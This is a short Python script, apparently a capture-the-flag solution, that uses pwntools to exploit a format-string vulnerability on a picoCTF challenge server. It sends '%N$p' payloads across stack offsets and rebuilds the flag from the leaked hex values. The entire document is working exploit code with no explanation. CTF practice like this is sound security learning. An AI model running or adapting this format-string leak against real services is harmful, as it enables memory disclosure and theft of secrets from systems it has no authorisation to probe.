
```python
from pwn import *
import re
import sys

context.log_level = 'warning'

def leak_flag(port):
    host, max_attempts, flag = "mimas.picoctf.net", 50, ""
    for i in range(14, max_attempts + 1):
        try:
            p = remote(host, port)
            p.recvuntil(b"Give me your order and I'll read it back to you:\n")
            p.sendline(f"%{i}$p".encode())
            response = p.recvuntil(b"Bye!").decode(errors="ignore")
            print(f"Offset {i}: {response}")
            match = re.search(r"0x([a-f0-9]+)", response)
            if match:
                try:
                    decoded = bytes.fromhex(match.group(1)).decode("utf-8")[::-1]
                    flag += decoded
                    print(f"[+] Flag: {flag}")
                    if "}" in decoded:
                        break
                except:
                    pass
            p.close()
        except Exception as e:
            print(f"[-] Error at offset {i}: {e}")
            break
    if "}" not in flag:
        print("[-] Flag not fully recovered. Try increasing max_attempts!\n")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <port>")
        sys.exit(1)
    leak_flag(int(sys.argv[1]))
```
